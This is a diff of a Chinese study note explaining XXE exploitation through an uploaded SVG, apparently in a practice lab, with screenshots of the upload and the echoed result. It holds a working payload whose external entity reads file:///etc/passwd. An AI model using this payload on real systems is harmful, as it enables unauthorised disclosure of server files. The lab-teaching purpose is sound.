@@ -17,21 +17,35 @@ SVG图像及其相关行为被定义于XML文本文件之中，意味着可以�
 如下是一个svg文件示例，也是由xml格式编辑
 ```xml
 <?xml version="1.0" standalone="yes"?>
+
 <!DOCTYPE svg [
+
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+
 ]>
 
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+<svg width="1800px" height="1100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
 
-  <text x="10" y="20" font-family="Arial" font-size="14">
+  <text x="10" y="40" font-family="Verdana" font-size="14">
 
     &xxe;
 
   </text>
+
+</svg>
 ```
 
 xml的声明：standalone标识无外部DTD引用
-DOCTYPE内部定义DTD命名实体xxe
+DOCTYPE内部定义DTD命名实体`xxe`
 然后是svg的声明，类似xinclude的声明
-text标签定义了文字字体大小和x和y轴的位置
-最后调用执行xxe实体
+`text`标签定义了文字字体大小和x和y轴的位置
+最后调用执行`xxe`实体
+<mark style="background: #FFB8EBA6;">注意</mark>最后闭合`</svg>`
+
+靶场上传svg文件
+
+![](assets/SVG进行XXE漏洞利用/file-20260110224129145.png)
+
+回显：
+
+![](assets/SVG进行XXE漏洞利用/file-20260110224129161.png)
